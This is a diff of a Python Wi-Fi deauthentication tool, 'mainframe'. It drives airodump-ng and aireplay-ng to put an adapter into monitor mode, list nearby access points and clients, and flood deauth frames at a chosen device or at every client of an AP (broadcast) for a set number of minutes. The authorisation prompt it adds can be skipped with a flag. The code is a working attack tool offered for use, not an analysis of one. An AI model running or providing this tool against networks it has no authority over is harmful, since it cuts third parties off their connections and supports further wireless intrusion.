@@ -1,416 +1,651 @@
 #!/usr/bin/env python3
 """
-mainframe — wifi deauth tool for kali.
+mainframe — a focused 802.11 deauthentication utility.
 
-surgical: only the interface you pick goes into monitor mode.
-your other wifi card stays online.
+Wraps the aircrack-ng suite (airodump-ng / aireplay-ng) behind an interactive,
+single-purpose workflow: pick one adapter, isolate it, scan, target, deauth,
+restore. Only the chosen interface is ever touched; every other adapter stays
+online for the entire session.
+
+For use only on networks you own or are explicitly authorised to test.
+
+Author : The Priest
+License: MIT
 """
 
+from __future__ import annotations
+
 import argparse
+import atexit
 import os
 import re
+import shutil
 import signal
 import subprocess
 import sys
+import tempfile
 import time
+from dataclasses import dataclass, field
 from pathlib import Path
 
-# ─── colors ───────────────────────────────────────────────────────────────────
+__version__ = "1.1.0"
+
+# ─── palette ──────────────────────────────────────────────────────────────────
 G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; C = "\033[96m"
 M = "\033[95m"; W = "\033[97m"; B = "\033[1m"; D = "\033[2m"; X = "\033[0m"
-CLR = "\033[2J\033[H"
 
 BANNER = rf"""{G}{B}
   __  __  ___ ___ _  _ ___ ___    _   __  __ ___
  |  \/  |/ _ \_ _| \| | __| _ \  /_\ |  \/  | __|
  | |\/| | (_) | || .` | _||   / / _ \| |\/| | _|
  |_|  |_|\___/___|_|\_|_| |_|_\/_/ \_\_|  |_|___|
-{X}{D} only touches the interface you pick. keeps you online on the rest.{X}
+{X}{D} v{__version__}  ·  isolates one adapter, leaves the rest online{X}
 """
 
-SCAN_DIR = Path("/tmp/mainframe")
+OUI_PATHS = (
+    "/var/lib/ieee-data/oui.txt",
+    "/usr/share/ieee-data/oui.txt",
+    "/usr/share/aircrack-ng/airodump-ng-oui.txt",
+)
+MAC_RE = re.compile(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")
+
+# per-process scratch dir for airodump output (created lazily, removed at exit)
+_SCANDIR: Path | None = None
 
 
-# ─── shell helpers ────────────────────────────────────────────────────────────
-def run(cmd, capture=True):
-    kw = {"stderr": subprocess.DEVNULL,
-          "stdout": subprocess.PIPE if capture else subprocess.DEVNULL}
-    r = subprocess.run(cmd, **kw)
-    return r.returncode, (r.stdout or b"").decode(errors="ignore")
+def scan_dir() -> Path:
+    global _SCANDIR
+    if _SCANDIR is None:
+        _SCANDIR = Path(tempfile.mkdtemp(prefix="mainframe-"))
+        atexit.register(_cleanup_scan_dir)
+    return _SCANDIR
 
 
-def need_root():
+def _cleanup_scan_dir() -> None:
+    if _SCANDIR and _SCANDIR.exists():
+        shutil.rmtree(_SCANDIR, ignore_errors=True)
+
+
+# ─── data models ──────────────────────────────────────────────────────────────
+@dataclass
+class Interface:
+    name: str
+    mode: str = "?"
+    driver: str = "?"
+    is_default_route: bool = False
+
+
+@dataclass
+class AccessPoint:
+    bssid: str
+    channel: str
+    power: str
+    essid: str
+
+    @property
+    def band(self) -> str:
+        return band_of(self.channel)
+
+
+@dataclass
+class Client:
+    mac: str
+    power: str
+    bssid: str
+
+
+@dataclass
+class Session:
+    interface: str | None = None
+    monitor_active: bool = False
+    targets: list[str] = field(default_factory=list)
+
+
+# ─── shell plumbing ───────────────────────────────────────────────────────────
+def run(cmd: list[str], capture: bool = True) -> tuple[int, str]:
+    """Run a command, never raising. Returns (returncode, stdout)."""
+    try:
+        proc = subprocess.run(
+            cmd,
+            stdout=subprocess.PIPE if capture else subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        return proc.returncode, (proc.stdout or b"").decode(errors="ignore")
+    except FileNotFoundError:
+        return 127, ""
+
+
+def have(tool: str) -> bool:
+    return shutil.which(tool) is not None
+
+
+def die(msg: str, code: int = 1):
+    print(f"{R}error:{X} {msg}")
+    sys.exit(code)
+
+
+def require_root() -> None:
     if os.geteuid() != 0:
-        print(f"{R}needs root. re-run with sudo (or via pkexec / launcher).{X}")
-        sys.exit(1)
+        die("needs root. run with sudo, or launch via the desktop entry (pkexec).")
 
 
-def need_tools():
+def require_tools() -> None:
     missing = [t for t in ("airodump-ng", "aireplay-ng", "iw", "ip", "nmcli")
-               if run(["which", t])[0] != 0]
+               if not have(t)]
     if missing:
-        print(f"{R}missing tools:{X} {', '.join(missing)}")
+        print(f"{R}missing required tools:{X} {', '.join(missing)}")
         print(f"{D}  apt install aircrack-ng iw iproute2 network-manager{X}")
         sys.exit(1)
 
 
-# ─── oui vendor lookup ────────────────────────────────────────────────────────
-_OUI = None
+# ─── power helpers ────────────────────────────────────────────────────────────
+def power_int(raw: str) -> int | None:
+    """Return signal in dBm, or None if unknown. airodump uses -1 for 'unmeasured'."""
+    try:
+        v = int(raw)
+    except (TypeError, ValueError):
+        return None
+    if v >= 0 or v == -1:   # 0/-1/positive = no valid measurement
+        return None
+    return v
 
-def load_oui():
+
+# ─── OUI / vendor lookup ──────────────────────────────────────────────────────
+_OUI: dict[str, str] | None = None
+
+
+def _load_oui() -> dict[str, str]:
     global _OUI
     if _OUI is not None:
         return _OUI
     _OUI = {}
-    for path in ("/var/lib/ieee-data/oui.txt", "/usr/share/ieee-data/oui.txt"):
+    pat = re.compile(r"^([0-9A-Fa-f]{6})\s+\(base 16\)\s+(.+?)\s*$")
+    for path in OUI_PATHS:
         p = Path(path)
         if not p.exists():
             continue
-        pat = re.compile(r"^([0-9A-F]{6})\s+\(base 16\)\s+(.+?)\s*$")
         try:
-            with p.open(errors="ignore") as f:
-                for line in f:
+            with p.open(errors="ignore") as fh:
+                for line in fh:
                     m = pat.match(line)
                     if m:
-                        _OUI[m.group(1)] = m.group(2)
+                        _OUI[m.group(1).upper()] = m.group(2)
         except OSError:
-            pass
-        break
+            continue
+        if _OUI:
+            break
     return _OUI
 
 
-def vendor_of(mac):
-    table = load_oui()
+def vendor(mac: str) -> str:
+    table = _load_oui()
     if not table:
         return ""
     return table.get(mac.upper().replace(":", "")[:6], "")
 
 
-# ─── display helpers ──────────────────────────────────────────────────────────
-def bars(power):
-    try:
-        p = int(power)
-    except (TypeError, ValueError):
-        return f"{D}····{X}"
-    if p >= -50: return f"{G}▁▃▅▇{X}"
-    if p >= -60: return f"{G}▁▃▅·{X}"
-    if p >= -70: return f"{Y}▁▃··{X}"
-    if p >= -80: return f"{Y}▁···{X}"
+# ─── presentation ─────────────────────────────────────────────────────────────
+def clear():
+    print("\033[2J\033[H", end="")
+
+
+def header(text: str):
+    pad = max(2, 44 - len(text))
+    print(f"\n{C}{B}━━ {text} {'━' * pad}{X}")
+
+
+def bars(raw: str) -> str:
+    p = power_int(raw)
+    if p is None:
+        return f"{D}··· ?{X}"
+    if p >= -50: return f"{G}▇▅▃▁{X}"
+    if p >= -60: return f"{G}·▅▃▁{X}"
+    if p >= -70: return f"{Y}··▃▁{X}"
+    if p >= -80: return f"{Y}···▁{X}"
     return f"{R}····{X}"
 
 
-def band_of(ch):
+def power_label(raw: str) -> str:
+    p = power_int(raw)
+    return f"{p} dBm" if p is not None else "signal n/a"
+
+
+def band_of(channel: str) -> str:
     try:
-        c = int(ch)
+        c = int(channel)
     except (TypeError, ValueError):
         return "?"
-    if 1 <= c <= 14: return "2.4"
-    if c >= 36:      return "5"
+    if 1 <= c <= 14:
+        return "2.4"
+    if c >= 36:
+        return "5"
     return "?"
 
 
-def header(text):
-    print(f"\n{C}{B}━━ {text} ━━{X}")
+def band_color(band: str) -> str:
+    return {"2.4": G, "5": Y}.get(band, D)
 
 
-# ─── interface handling ───────────────────────────────────────────────────────
-def list_wireless():
+def prompt(text: str) -> str:
+    try:
+        return input(f"{G}{text}{X}").strip()
+    except EOFError:
+        return ""
+
+
+# ─── interface discovery ──────────────────────────────────────────────────────
+def discover_interfaces() -> list[Interface]:
     rc, out = run(["iw", "dev"])
     if rc != 0:
         return []
-    ifaces, cur = [], None
+
+    interfaces: list[Interface] = []
+    cur: Interface | None = None
     for line in out.splitlines():
         m = re.match(r"\s*Interface (\S+)", line)
         if m:
             if cur:
-                ifaces.append(cur)
-            cur = {"name": m.group(1), "mode": "?", "driver": "?", "internet": False}
+                interfaces.append(cur)
+            cur = Interface(name=m.group(1))
         elif cur:
-            mm = re.search(r"type (\S+)", line)
+            mm = re.search(r"\btype (\S+)", line)
             if mm:
-                cur["mode"] = mm.group(1)
+                cur.mode = mm.group(1)
     if cur:
-        ifaces.append(cur)
+        interfaces.append(cur)
 
     _, route = run(["ip", "route", "show", "default"])
-    m = re.search(r"dev (\S+)", route)
-    default_iface = m.group(1) if m else None
+    default_iface = None
+    m = re.search(r"\bdev (\S+)", route)
+    if m:
+        default_iface = m.group(1)
 
-    for i in ifaces:
-        i["internet"] = (i["name"] == default_iface)
+    for iface in interfaces:
+        iface.is_default_route = (iface.name == default_iface)
         try:
-            i["driver"] = Path(f"/sys/class/net/{i['name']}/device/driver").resolve().name
+            iface.driver = Path(
+                f"/sys/class/net/{iface.name}/device/driver"
+            ).resolve().name
         except OSError:
             pass
-    return ifaces
+    return interfaces
 
 
-def pick_interface(preselect=None):
-    ifaces = list_wireless()
-    if not ifaces:
-        print(f"{R}no wireless interfaces found. plug in the ar9271?{X}")
-        sys.exit(1)
+def select_interface(preselect: str | None, assume_yes: bool) -> Interface:
+    interfaces = discover_interfaces()
+    if not interfaces:
+        die("no wireless interfaces found. is the AR9271 plugged in?")
 
     if preselect:
-        for i in ifaces:
-            if i["name"] == preselect:
-                return i
-        print(f"{R}interface {preselect} not found{X}")
-        sys.exit(1)
+        chosen = next((i for i in interfaces if i.name == preselect), None)
+        if chosen is None:
+            die(f"interface '{preselect}' not found")
+    else:
+        # Never offer the adapter carrying your internet, unless it's all you have.
+        candidates = [i for i in interfaces if not i.is_default_route] or interfaces
 
-    candidates = [i for i in ifaces if not i["internet"]] or ifaces
+        header("wireless adapters")
+        for idx, iface in enumerate(candidates):
+            tags = []
+            if iface.is_default_route:
+                tags.append(f"{R}carries your internet{X}")
+            if any(d in iface.driver for d in ("ath9k", "rtl", "mt76", "rt2800")):
+                tags.append(f"{G}injection-capable likely{X}")
+            tagstr = "   " + "  ".join(tags) if tags else ""
+            print(f"  {G}[{idx}]{X} {B}{iface.name:<8}{X} {D}{iface.driver}{X}{tagstr}")
 
-    header("wireless interfaces")
-    for idx, i in enumerate(candidates):
-        flags = []
-        if i["internet"]:
-            flags.append(f"{R}!! IN USE FOR INTERNET{X}")
-        if "ath9k" in i["driver"] or "rtl" in i["driver"]:
-            flags.append(f"{G}injection-capable likely{X}")
-        flag_str = "  " + " ".join(flags) if flags else ""
-        print(f"  {G}[{idx}]{X} {B}{i['name']}{X}  {D}driver:{X} {i['driver']}{flag_str}")
+        if len(candidates) == 1:
+            chosen = candidates[0]
+            print(f"\n{D}auto-selecting {chosen.name} (sole candidate){X}")
+        else:
+            while True:
+                sel = prompt("\nadapter> ")
+                try:
+                    chosen = candidates[int(sel)]
+                    break
+                except (ValueError, IndexError):
+                    print(f"{R}invalid selection{X}")
 
-    if len(candidates) == 1:
-        print(f"\n{D}auto-picking {candidates[0]['name']} (only candidate){X}")
-        return candidates[0]
-
-    while True:
-        try:
-            n = int(input(f"\n{G}pick> {X}").strip())
-            return candidates[n]
-        except (ValueError, IndexError):
-            print(f"{R}invalid{X}")
+    if chosen.is_default_route and not assume_yes:
+        print(f"{R}warning:{X} {chosen.name} is currently carrying your internet.")
+        print(f"{D}using it will drop your connection until the session ends.{X}")
+        if prompt("use it anyway? [y/N] ").lower() != "y":
+            die("cancelled.")
+    return chosen
 
 
-# ─── monitor mode (surgical) ──────────────────────────────────────────────────
-def enter_monitor(iface):
-    name = iface["name"]
-    print(f"\n{D}isolating {name} from NetworkManager...{X}")
+# ─── monitor mode (surgical, verified) ────────────────────────────────────────
+def enter_monitor(iface: Interface, session: Session) -> str:
+    name = iface.name
+    print(f"\n{D}isolating {name} from NetworkManager (other adapters untouched)…{X}")
     run(["nmcli", "device", "set", name, "managed", "no"], capture=False)
 
-    # kill only wpa_supplicant tied to this interface, if any
-    rc, out = run(["pgrep", "-af", f"wpa_supplicant.*\\-i.*{name}"])
-    for line in out.splitlines():
-        pid = line.split()[0] if line.strip() else None
-        if pid:
+    # Stop only a wpa_supplicant bound to THIS interface (word-boundary safe).
+    _, ps = run(["pgrep", "-af", "wpa_supplicant"])
+    iface_flag = re.compile(rf"-i\s*{re.escape(name)}\b")
+    for line in ps.splitlines():
+        if iface_flag.search(line):
+            pid = line.split(maxsplit=1)[0]
             run(["kill", pid], capture=False)
 
     run(["ip", "link", "set", name, "down"], capture=False)
     rc, _ = run(["iw", "dev", name, "set", "type", "monitor"])
-    if rc != 0:
-        print(f"{R}failed to set monitor mode on {name}.{X}")
-        print(f"{D}does this adapter support monitor mode?{X}")
-        run(["nmcli", "device", "set", name, "managed", "yes"], capture=False)
-        sys.exit(1)
     run(["ip", "link", "set", name, "up"], capture=False)
-    print(f"{G}✓ {name} now in monitor mode (other interfaces untouched){X}")
+
+    if rc != 0 or not _is_monitor(name):
+        run(["nmcli", "device", "set", name, "managed", "yes"], capture=False)
+        die(f"{name} would not enter monitor mode — does this adapter support it?")
+
+    session.interface = name
+    session.monitor_active = True
+    print(f"{G}✓ {name} is in monitor mode.{X}")
     return name
 
 
-def exit_monitor(name):
-    print(f"\n{D}restoring {name} to managed mode...{X}")
+def _is_monitor(name: str) -> bool:
+    rc, out = run(["iw", "dev", name, "info"])
+    return rc == 0 and "type monitor" in out
+
+
+def exit_monitor(session: Session) -> None:
+    if not session.monitor_active or not session.interface:
+        return
+    name = session.interface
+    print(f"\n{D}restoring {name} to managed mode…{X}")
     run(["ip", "link", "set", name, "down"], capture=False)
     run(["iw", "dev", name, "set", "type", "managed"], capture=False)
     run(["ip", "link", "set", name, "up"], capture=False)
     run(["nmcli", "device", "set", name, "managed", "yes"], capture=False)
-    print(f"{G}✓ {name} back online.{X}")
+    session.monitor_active = False
+    print(f"{G}✓ {name} restored and managed by NetworkManager again.{X}")
+
+
+def set_channel(name: str, channel: str) -> bool:
+    rc, _ = run(["iw", "dev", name, "set", "channel", str(channel)])
+    return rc == 0
 
 
 # ─── scanning ─────────────────────────────────────────────────────────────────
-def scan(mon, seconds, channel=None, label="scanning"):
-    SCAN_DIR.mkdir(exist_ok=True)
-    for f in SCAN_DIR.glob("scan*"):
-        try: f.unlink()
-        except OSError: pass
+def scan(mon: str, seconds: int, channel: str | None = None,
+         bands: str | None = None,
+         label: str = "scanning") -> tuple[list[AccessPoint], list[Client]]:
+    sd = scan_dir()
+    for f in sd.glob("scan*"):
+        try:
+            f.unlink()
+        except OSError:
+            pass
+    prefix = str(sd / "scan")
 
-    prefix = str(SCAN_DIR / "scan")
-    cmd = ["airodump-ng", "--write", prefix, "--output-format", "csv"]
+    cmd = ["airodump-ng", "--write", prefix, "--output-format", "csv",
+           "--write-interval", "1"]
     if channel:
-        cmd += ["-c", str(channel)]
+        cmd += ["--channel", str(channel)]
+    elif bands:
+        cmd += ["--band", bands]
     cmd.append(mon)
 
     proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     print()
     try:
         for left in range(seconds, 0, -1):
-            print(f"  {C}{label}...{X} {D}{left:>3}s left  (ctrl-c to stop early){X}", end="\r")
+            print(f"  {C}{label}{X} {D}· {left:>3}s left · ctrl-c to stop early{X}",
+                  end="\r", flush=True)
             time.sleep(1)
     except KeyboardInterrupt:
         print()
     finally:
         proc.send_signal(signal.SIGINT)
-        try: proc.wait(timeout=3)
-        except subprocess.TimeoutExpired: proc.kill()
-    print(" " * 60, end="\r")
+        try:
+            proc.wait(timeout=4)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+    print(" " * 64, end="\r")
 
     csv = Path(f"{prefix}-01.csv")
     if not csv.exists():
         return [], []
-    return parse_csv(csv.read_text(errors="ignore"))
+    return _parse_csv(csv.read_text(errors="ignore"))
 
 
-def parse_csv(raw):
-    sections = re.split(r"\r?\n\r?\n", raw)
-    aps, clients = [], []
+def _parse_csv(raw: str) -> tuple[list[AccessPoint], list[Client]]:
+    # airodump CSV: AP table, blank line, station table.
+    sections = re.split(r"\r?\n\s*\r?\n", raw, maxsplit=1)
+    aps: list[AccessPoint] = []
+    clients: list[Client] = []
+
     if sections:
         for line in sections[0].splitlines()[1:]:
-            cells = [c.strip() for c in line.split(",")]
-            if len(cells) < 14 or not re.match(r"^[0-9A-Fa-f:]{17}$", cells[0]):
+            # Split only the 13 fixed leading fields; the remainder is
+            # "ESSID[,...], Key". ESSID can contain commas, so we keep the raw
+            # remainder and peel the final Key field off the end.
+            parts = line.split(",", 13)
+            if len(parts) < 14 or not MAC_RE.match(parts[0].strip()):
                 continue
-            essid = cells[13] if cells[13] else "<hidden>"
-            aps.append({"bssid": cells[0], "channel": cells[3],
-                        "power": cells[8], "essid": essid})
+            essid = parts[13].rsplit(",", 1)[0].strip() or "<hidden>"
+            aps.append(AccessPoint(
+                bssid=parts[0].strip(),
+                channel=parts[3].strip(),
+                power=parts[8].strip(),
+                essid=essid,
+            ))
+
     if len(sections) > 1:
         for line in sections[1].splitlines()[1:]:
             cells = [c.strip() for c in line.split(",")]
-            if len(cells) < 6 or not re.match(r"^[0-9A-Fa-f:]{17}$", cells[0]):
+            if len(cells) < 6 or not MAC_RE.match(cells[0]):
                 continue
-            clients.append({"mac": cells[0], "power": cells[3], "bssid": cells[5]})
+            clients.append(Client(mac=cells[0], power=cells[3], bssid=cells[5]))
+
     return aps, clients
 
 
-# ─── pickers ──────────────────────────────────────────────────────────────────
-def pick_ap(aps, all_bands=False):
+# ─── selection ────────────────────────────────────────────────────────────────
+def _signal_key(raw: str) -> int:
+    """Sort key: strongest first, unknown signal last."""
+    p = power_int(raw)
+    return -p if p is not None else 10_000
+
+
+def select_ap(aps: list[AccessPoint], show_all_bands: bool) -> AccessPoint | None:
     if not aps:
-        print(f"{R}no APs found. try a longer scan (-s 30).{X}")
+        print(f"{R}no access points found.{X} {D}try a longer scan: -s 30{X}")
         return None
 
-    def pkey(a):
-        try: return -int(a["power"])
-        except ValueError: return 9999
-    aps = sorted(aps, key=pkey)
+    aps = sorted(aps, key=lambda a: _signal_key(a.power))
+    if not show_all_bands:
+        twofour = [a for a in aps if a.band == "2.4"]
+        if twofour:
+            aps = twofour
 
-    if not all_bands:
-        aps_24 = [a for a in aps if band_of(a["channel"]) == "2.4"]
-        if aps_24:
-            aps = aps_24
-
-    header(f"APs nearby  ({'2.4 GHz only — use --all-bands to see 5 GHz' if not all_bands else 'all bands'})")
-    for idx, a in enumerate(aps):
-        bnd = band_of(a["channel"])
-        bnd_col = G if bnd == "2.4" else (Y if bnd == "5" else D)
-        essid = a["essid"][:32] or "<hidden>"
-        print(f"  {G}[{idx:>2}]{X} {B}{essid}{X}")
-        print(f"        {D}{a['bssid']}{X}  ch {a['channel']:>2}  {bnd_col}{bnd} GHz{X}  {bars(a['power'])}  {D}{a['power']} dBm{X}")
+    scope = "all bands" if show_all_bands else "2.4 GHz only — add --all-bands for 5 GHz"
+    header(f"access points · {scope}")
+    for idx, ap in enumerate(aps):
+        bc = band_color(ap.band)
+        print(f"  {G}[{idx:>2}]{X} {B}{ap.essid[:32]}{X}")
+        print(f"       {D}{ap.bssid}{X}  ch {ap.channel:>3}  "
+              f"{bc}{ap.band:>3} GHz{X}  {bars(ap.power)} {D}{power_label(ap.power)}{X}")
 
     while True:
-        s = input(f"\n{G}pick AP> {X}").strip().lower()
-        if s in ("q", "quit", "exit"):
+        sel = prompt("\ntarget AP (number, q to quit)> ").lower()
+        if sel in ("q", "quit", ""):
             return None
         try:
-            chosen = aps[int(s)]
-            if band_of(chosen["channel"]) == "5":
-                print(f"{Y}warning:{X} that AP is on 5 GHz. AR9271 cannot deauth there.")
-                if input(f"{D}continue anyway? [y/N] {X}").strip().lower() != "y":
-                    continue
-            return chosen
+            ap = aps[int(sel)]
         except (ValueError, IndexError):
-            print(f"{R}invalid{X}")
+            print(f"{R}invalid selection{X}")
+            continue
+        if ap.band == "5":
+            print(f"{Y}note:{X} this AP is on 5 GHz; the AR9271 cannot deauth there.")
+            if prompt("continue anyway? [y/N] ").lower() != "y":
+                continue
+        return ap
 
 
-def pick_client(clients, ap):
-    matching = [c for c in clients if c["bssid"].lower() == ap["bssid"].lower()]
+def select_client(clients: list[Client], ap: AccessPoint):
+    matching = [c for c in clients if c.bssid.lower() == ap.bssid.lower()]
+    matching.sort(key=lambda c: _signal_key(c.power))
 
-    header(f"clients on {ap['essid']}")
+    header(f"clients on {ap.essid}")
     if not matching:
-        print(f"  {D}none detected yet (clients only show up when transmitting){X}")
+        print(f"  {D}none seen yet — devices only appear while transmitting{X}")
     else:
         for idx, c in enumerate(matching):
-            v = vendor_of(c["mac"])
-            v_str = f"  {C}{v}{X}" if v else ""
-            print(f"  {G}[{idx:>2}]{X} {B}{c['mac']}{X}  {bars(c['power'])}{v_str}")
+            v = vendor(c.mac)
+            vstr = f"  {C}{v}{X}" if v else ""
+            print(f"  {G}[{idx:>2}]{X} {B}{c.mac}{X}  {bars(c.power)}{vstr}")
 
-    print(f"\n  {G}[a]{X}  {Y}ALL clients{X} (broadcast deauth — kicks everyone on this AP)")
-    print(f"  {G}[r]{X}  rescan for clients (longer)")
+    print(f"\n  {G}[a]{X}  {Y}all clients{X} — broadcast deauth (everyone on this AP)")
+    print(f"  {G}[r]{X}  rescan (the device may not have surfaced yet)")
     print(f"  {G}[q]{X}  cancel")
 
     while True:
-        s = input(f"\n{G}pick> {X}").strip().lower()
-        if s == "q": return "cancel"
-        if s == "r": return "rescan"
-        if s == "a": return None
+        sel = prompt("\nselect> ").lower()
+        if sel == "q":
+            return "cancel"
+        if sel == "r":
+            return "rescan"
+        if sel == "a":
+            return None
         try:
-            return matching[int(s)]["mac"]
+            return matching[int(sel)].mac
         except (ValueError, IndexError):
-            print(f"{R}invalid{X}")
+            print(f"{R}invalid selection{X}")
 
 
 # ─── deauth ───────────────────────────────────────────────────────────────────
-def confirm_deauth(ap, client_mac, duration_min):
+def confirm(ap: AccessPoint, client_mac: str | None, minutes: int) -> bool:
     header("confirm")
-    print(f"  target AP    : {B}{ap['essid']}{X}  {D}({ap['bssid']}){X}")
-    print(f"  channel      : {ap['channel']}  ({band_of(ap['channel'])} GHz)")
+    print(f"  AP        : {B}{ap.essid}{X}  {D}{ap.bssid}{X}")
+    print(f"  channel   : {ap.channel}  ({ap.band} GHz)")
     if client_mac:
-        v = vendor_of(client_mac)
-        v_str = f"  {C}{v}{X}" if v else ""
-        print(f"  target client: {B}{client_mac}{X}{v_str}")
+        v = vendor(client_mac)
+        print(f"  target    : {B}{client_mac}{X}" + (f"  {C}{v}{X}" if v else ""))
     else:
-        print(f"  target client: {Y}ALL CLIENTS{X} (broadcast)")
-    print(f"  duration     : {duration_min} min")
-    return input(f"\n{R}{B}proceed? [y/N] {X}").strip().lower() == "y"
+        print(f"  target    : {Y}ALL CLIENTS (broadcast){X}")
+    print(f"  duration  : {minutes} min")
+    return prompt(f"\n{R}{B}proceed? [y/N] {X}").lower() == "y"
 
 
-def deauth(mon, ap, client_mac, duration_min):
-    run(["iwconfig", mon, "channel", ap["channel"]], capture=False)
-    cmd = ["aireplay-ng", "--deauth", "0", "-a", ap["bssid"]]
+def deauth(mon: str, ap: AccessPoint, client_mac: str | None, minutes: int) -> None:
+    if not set_channel(mon, ap.channel):
+        print(f"{Y}warning: couldn't lock channel {ap.channel}; continuing anyway{X}")
+
+    cmd = ["aireplay-ng", "--deauth", "0", "--ignore-negative-one", "-a", ap.bssid]
     if client_mac:
         cmd += ["-c", client_mac]
     cmd.append(mon)
 
-    end = time.time() + duration_min * 60
-    print(f"\n{R}{B}>> deauth active. ctrl-c to stop early{X}")
+    end = time.time() + minutes * 60
+    target = client_mac or "all clients"
+    print(f"\n{R}{B}» deauth active against {target} — ctrl-c to stop early{X}")
+
     proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     try:
         while time.time() < end:
+            if proc.poll() is not None:
+                print(f"\n{Y}aireplay-ng exited early (rc={proc.returncode}). "
+                      f"channel/driver issue?{X}")
+                break
             left = int(end - time.time())
             mm, ss = divmod(left, 60)
-            print(f"  {R}●{X} deauthing  {B}{mm:02d}:{ss:02d}{X} left   ", end="\r")
+            print(f"  {R}●{X} running · {B}{mm:02d}:{ss:02d}{X} remaining   ",
+                  end="\r", flush=True)
             time.sleep(1)
         print()
     except KeyboardInterrupt:
         print(f"\n{Y}stopped early{X}")
     finally:
-        proc.terminate()
-        try: proc.wait(timeout=3)
-        except subprocess.TimeoutExpired: proc.kill()
-    print(f"{G}deauth done.{X}")
+        if proc.poll() is None:
+            proc.terminate()
+            try:
+                proc.wait(timeout=4)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+    print(f"{G}✓ deauth finished.{X}")
 
 
-# ─── main ─────────────────────────────────────────────────────────────────────
-def main():
-    p = argparse.ArgumentParser(description="surgical wifi deauth")
-    p.add_argument("-i", "--iface", help="skip interface picker")
+# ─── CLI ──────────────────────────────────────────────────────────────────────
+def build_parser() -> argparse.ArgumentParser:
+    p = argparse.ArgumentParser(
+        prog="mainframe",
+        description="Focused 802.11 deauthentication utility (your own networks only).",
+    )
+    p.add_argument("-i", "--iface", help="adapter to use (skips the picker)")
     p.add_argument("-s", "--scan-time", type=int, default=20,
-                   help="AP scan duration in seconds (default 20)")
+                   help="AP scan duration, seconds (default 20)")
     p.add_argument("-c", "--client-scan-time", type=int, default=30,
-                   help="focused client scan duration (default 30)")
+                   help="focused client scan duration, seconds (default 30)")
     p.add_argument("-t", "--time", type=int, default=10,
-                   help="deauth duration in minutes (default 10)")
+                   help="deauth duration, minutes (default 10)")
     p.add_argument("--all-bands", action="store_true",
-                   help="show 5 GHz APs too (AR9271 cannot deauth them)")
-    args = p.parse_args()
+                   help="also scan/show 5 GHz (needs a 5 GHz-capable adapter)")
+    p.add_argument("-y", "--yes", action="store_true",
+                   help="skip the authorisation acknowledgement prompt")
+    p.add_argument("-l", "--list", action="store_true",
+                   help="list wireless adapters and exit")
+    p.add_argument("-V", "--version", action="version",
+                   version=f"mainframe {__version__}")
+    return p
 
-    need_root()
-    need_tools()
+
+def validate_args(args) -> None:
+    if args.scan_time < 1:
+        die("--scan-time must be >= 1")
+    if args.client_scan_time < 1:
+        die("--client-scan-time must be >= 1")
+    if args.time < 1:
+        die("--time must be >= 1 minute")
+
+
+def list_and_exit():
+    for iface in discover_interfaces():
+        flag = f" {R}(internet){X}" if iface.is_default_route else ""
+        print(f"{iface.name:<10} {iface.mode:<10} {iface.driver}{flag}")
+    sys.exit(0)
+
+
+def acknowledge(skip: bool) -> None:
+    if skip:
+        return
+    print(f"{Y}This tool disrupts Wi-Fi. Use it only on networks you own or are{X}")
+    print(f"{Y}authorised to test. You are responsible for how you use it.{X}")
+    if prompt("type 'yes' to confirm you're authorised> ").lower() != "yes":
+        die("not acknowledged; exiting.")
+
+
+# ─── orchestration ────────────────────────────────────────────────────────────
+def main() -> None:
+    args = build_parser().parse_args()
+    validate_args(args)
+
+    require_root()
+    require_tools()
+
+    if args.list:
+        list_and_exit()
+
+    clear()
     print(BANNER)
-    print(f"{Y}only on networks you own. you're responsible for what you do.{X}")
+    acknowledge(args.yes)
 
-    iface = pick_interface(args.iface)
-    mon = enter_monitor(iface)
+    session = Session()
+    iface = select_interface(args.iface, args.yes)
 
     try:
-        # phase 1: wide AP scan
-        aps, _ = scan(mon, args.scan_time, label="scanning for APs")
-        ap = pick_ap(aps, all_bands=args.all_bands)
-        if not ap:
+        mon = enter_monitor(iface, session)
+
+        bands = "abg" if args.all_bands else "bg"
+        aps, _ = scan(mon, args.scan_time, bands=bands,
+                      label="scanning for access points")
+        ap = select_ap(aps, args.all_bands)
+        if ap is None:
             return
 
-        # phase 2: focused client scan on AP's channel
         while True:
-            _, clients = scan(mon, args.client_scan_time,
-                              channel=ap["channel"],
-                              label=f"scanning clients on ch {ap['channel']}")
-            choice = pick_client(clients, ap)
+            _, clients = scan(mon, args.client_scan_time, channel=ap.channel,
+                              label=f"scanning clients on channel {ap.channel}")
+            choice = select_client(clients, ap)
             if choice == "cancel":
                 return
             if choice == "rescan":
@@ -418,19 +653,23 @@ def main():
             client_mac = choice
             break
 
-        if not confirm_deauth(ap, client_mac, args.time):
-            print(f"{D}aborted{X}")
+        if not confirm(ap, client_mac, args.time):
+            print(f"{D}aborted by user{X}")
             return
 
+        session.targets.append(client_mac or f"broadcast@{ap.bssid}")
         deauth(mon, ap, client_mac, args.time)
 
     finally:
-        exit_monitor(mon)
+        exit_monitor(session)
+        if session.targets:
+            print(f"\n{D}session summary: {len(session.targets)} target(s) — "
+                  f"{', '.join(session.targets)}{X}")
 
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print(f"\n{Y}aborted{X}")
+        print(f"\n{Y}interrupted{X}")
         sys.exit(130)
